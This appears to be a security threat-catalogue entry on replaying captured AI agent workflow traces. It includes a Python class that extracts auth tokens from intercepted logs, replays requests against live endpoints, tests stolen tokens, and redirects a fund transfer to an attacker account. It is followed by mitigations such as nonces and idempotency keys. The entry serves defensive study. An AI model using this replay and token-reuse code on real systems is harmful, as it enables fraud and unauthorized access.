---
id: "TS-2026-0169"
title: "Agent Workflow Replay Attack"
category: "P3"
severity: "High"
description: "An attacker captures and replays a legitimate agent workflow execution—including tool calls, API requests, and authentication tokens—to duplicate actions, bypass authorization checks, or exploit time-sensitive operations after the original context has changed."
date: "2026-02-26"
tags: ["replay-attack", "workflow", "idempotency", "token-replay", "agent-automation", "request-replay"]
---

## Overview

AI agent workflows consist of sequences of tool calls, API requests, and decision points. Unlike simple API replay attacks, agent workflow replays can reproduce entire multi-step sequences—including the reasoning that led to each action. If workflow executions are not protected by nonces, timestamps, or idempotency keys, an attacker who intercepts a workflow trace can replay it to duplicate transactions, re-execute approved actions after conditions have changed, or trigger workflows with stale but still-valid authentication tokens. This is especially dangerous for workflows involving financial transactions, access provisioning, or irreversible operations.

## Attack Vector

1. Attacker intercepts an agent workflow trace (via logs, network capture, compromised observability tools, or shared audit trails)
2. The trace contains: tool call sequences, parameters, authentication tokens, and execution context
3. Attacker replays the workflow (entirely or selectively) against the same or different endpoints
4. Server-side systems process the replayed requests as legitimate because no replay protection exists
5. Actions are duplicated: payments processed twice, access granted after revocation, or operations repeated

## Technical Details

```python
import time, hmac, hashlib, json, requests

class WorkflowReplayAttack:
    """Capture and replay agent workflow executions."""
    
    def capture_workflow_trace(self, intercepted_log: list) -> dict:
        """Extract replayable workflow from intercepted agent logs."""
        workflow = {
            "captured_at": time.time(),
            "steps": []
        }
        
        for entry in intercepted_log:
            if entry["type"] == "tool_call":
                workflow["steps"].append({
                    "tool": entry["tool_name"],
                    "params": entry["parameters"],
                    "auth_header": entry.get("headers", {}).get("Authorization"),
                    "endpoint": entry.get("url"),
                    "timestamp": entry["timestamp"],
                    "response": entry.get("response")
                })
        
        return workflow
    
    def replay_workflow(self, workflow: dict, delay: float = 0.5):
        """Replay captured workflow steps against live endpoints."""
        results = []
        for step in workflow["steps"]:
            headers = {}
            if step.get("auth_header"):
                headers["Authorization"] = step["auth_header"]
            
            # Replay the exact request
            resp = requests.post(
                step["endpoint"],
                json=step["params"],
                headers=headers
            )
            
            results.append({
                "tool": step["tool"],
                "status": resp.status_code,
                "replayed": True,
                "original_time": step["timestamp"],
                "replay_time": time.time()
            })
            time.sleep(delay)  # Avoid rate limiting
        
        return results
    
    def selective_replay(self, workflow: dict, target_tools: list):
        """Replay only specific high-value steps from the workflow."""
        # Cherry-pick the valuable actions (payments, access grants)
        high_value_steps = [
            s for s in workflow["steps"] 
            if s["tool"] in target_tools
        ]
        
        # Example: replay only the payment step, skipping validation steps
        # The payment API processes it as a new legitimate transaction
        return self.replay_workflow({"steps": high_value_steps})
    
    def token_lifetime_exploit(self, workflow: dict) -> dict:
        """Exploit long-lived tokens captured in workflow traces."""
        tokens = set()
        for step in workflow["steps"]:
            if step.get("auth_header"):
                tokens.add(step["auth_header"])
        
        # Test each captured token for validity
        valid_tokens = []
        for token in tokens:
            resp = requests.get(
                "https://api.target.com/v1/me",
                headers={"Authorization": token}
            )
            if resp.status_code == 200:
                valid_tokens.append({
                    "token": token[:20] + "...",
                    "user": resp.json().get("email"),
                    "scopes": resp.json().get("scopes"),
                    "captured_age_hours": (time.time() - workflow["captured_at"]) / 3600
                })
        
        return {"valid_tokens": valid_tokens}
    
    def modified_replay(self, workflow: dict):
        """Replay with modified parameters (e.g., different recipient)."""
        for step in workflow["steps"]:
            if step["tool"] == "transfer_funds":
                # Change the recipient but keep the auth and amount
                step["params"]["recipient_account"] = "attacker-account-9876"
                # The payment system sees a valid auth token + valid amount
                # Only the recipient differs
        
        return self.replay_workflow(workflow)
```

## Impact

- **Financial Loss**: Duplicate payment processing, unauthorized fund transfers
- **Access Persistence**: Replayed access-grant workflows reactivate revoked permissions
- **Data Duplication**: Replayed data-processing workflows corrupt databases with duplicate records
- **Audit Trail Confusion**: Replayed workflows create legitimate-looking audit entries that obscure the attack
- **Time-of-Check/Time-of-Use**: Replaying approved workflows after conditions change (e.g., budget depleted, access revoked)

## Mitigation

1. **Idempotency Keys**: Require unique idempotency keys for all state-changing operations; reject duplicates
2. **Request Nonces**: Include single-use nonces in every tool call; server rejects previously seen nonces
3. **Timestamp Validation**: Reject requests with timestamps outside a narrow window (e.g., ±5 minutes)
4. **Token Binding**: Bind tokens to session context (IP, device fingerprint); reject tokens used from different contexts
5. **Short-Lived Tokens**: Use tokens with minimal TTL; require re-authentication for sensitive operations
6. **Workflow Signing**: Cryptographically sign entire workflow sequences; verify sequence integrity before execution
7. **Observability Security**: Encrypt and access-control workflow logs and traces; redact tokens in observability data

## References

- [OWASP: Replay Attack Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Transaction_Authorization_Cheat_Sheet.html)
- [TS-2026-0050](/skill/TS-2026-0050) — Agent Credential Theft via Tool Exploitation
- [TS-2026-0165](/skill/TS-2026-0165) — Agent Credential Rotation Interference
- [RFC 7616: HTTP Digest Authentication (nonce handling)](https://tools.ietf.org/html/rfc7616)
